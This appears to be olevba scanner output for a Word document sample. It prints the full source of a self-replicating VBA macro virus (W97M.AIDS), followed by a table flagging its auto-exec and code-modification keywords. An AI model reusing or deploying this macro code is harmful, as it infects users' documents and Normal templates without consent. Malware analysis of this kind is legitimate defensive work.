olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allfunc-a72abd53d196ee3e5c559187a4ba2c848e8cde2b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allfunc-a72abd53d196ee3e5c559187a4ba2c848e8cde2b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Function AIDS()
Application.EnableCancelKey = wdCancelDisabled
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Set TD = ThisDocument.VBProject.VBComponents
For FindCode = 1 To TD.Count
If TD.Item(FindCode).CodeModule.CountOfLines > 0 Then
For CodeLines = 1 To TD.Item(FindCode).CodeModule.CountOfLines
If TD.Item(FindCode).CodeModule.Lines(CodeLines, 1) = "Private Function AIDS()" Then
MyCode = TD.Item(FindCode).CodeModule.Lines(CodeLines, 32)
End If
Next
End If
Next
If ThisDocument = ActiveDocument Then Set Target = NormalTemplate Else Set Target = ActiveDocument
Set TargetComp = Target.VBProject.VBComponents
For TargetModule = 1 To TargetComp.Count
If TargetComp.Item(TargetModule).CodeModule.CountOfLines > 0 Then
For CodeLines = 1 To TargetComp.Item(TargetModule).CodeModule.CountOfLines
If TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1) = "Private Function AIDS()" Then End
Next
For CodeLines = 1 To TargetComp.Item(TargetModule).CodeModule.CountOfLines
If Left(TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1), 12) = "Private Sub " Then
TargetComp.Item(TargetModule).CodeModule.ReplaceLine CodeLines, TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1) & ": AIDS"
ElseIf Left(TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1), 4) = "Sub " Then
TargetComp.Item(TargetModule).CodeModule.ReplaceLine CodeLines, TargetComp.Item(TargetModule).CodeModule.Lines(CodeLines, 1) & ": AIDS"
End If
Next
TargetComp.Item(TargetModule).CodeModule.AddFromString MyCode
End If
Next
End Function
Private Sub Document_Open(): AIDS
End Sub
'Do Not Distribute
'Name = W97M.AIDS
'Author = Lys Kovick
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

